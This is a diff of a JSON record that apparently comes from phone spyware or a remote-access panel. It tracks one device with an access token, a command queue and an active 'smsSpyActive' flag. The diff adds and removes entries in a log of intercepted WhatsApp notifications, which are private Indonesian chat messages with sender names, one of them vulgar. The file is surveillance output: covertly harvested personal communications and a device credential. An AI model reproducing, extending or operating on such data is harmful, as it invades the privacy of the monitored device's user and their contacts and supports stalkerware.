@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-CA6D",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "1505d9de1a287ae732b4f22d45e58506",
-    "lastSeen": 1777173666817,
+    "lastSeen": 1777173673051,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:08:43.334Z",
@@ -20,6 +20,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "jas",
+        "content": "dapet salam dari mantan",
+        "time": "26/04 11:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777173673111
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1243 pesan dari 19 chat",
+        "time": "26/04 11:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777173667152
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "jas",
+        "content": "📡 Undangan admin saluran",
+        "time": "26/04 11:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777173667147
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1244 pesan dari 19 chat",
+        "time": "26/04 11:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777173667139
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "jas",
+        "content": "dapet salam dari mantan",
+        "time": "26/04 11:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777173667133
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -3979,46 +4019,6 @@
         "time": "26/04 11:19",
         "pkg": "com.whatsapp",
         "receivedAt": 1777172938518
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎1069 pesan dari 19 chat",
-        "time": "26/04 11:19",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777172936915
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝟐𝟐𝟓 𝐀𝐑𝐄𝐀 (22 pesan): ~ el",
-        "content": "iya woii",
-        "time": "26/04 11:19",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777172936837
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝘼𝙈𝘽𝘼𝙇𝙄𝙂𝙃𝙏𝙉𝙄𝙉𝙂⚡ (118 pesan): ~ aditya eka",
-        "content": "Lu punya kontol kan?",
-        "time": "26/04 11:19",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777172936451
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎1068 pesan dari 19 chat",
-        "time": "26/04 11:19",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777172936443
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎1067 pesan dari 19 chat",
-        "time": "26/04 11:19",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777172935850
       }
     ],
     "galleryPhotos": [],
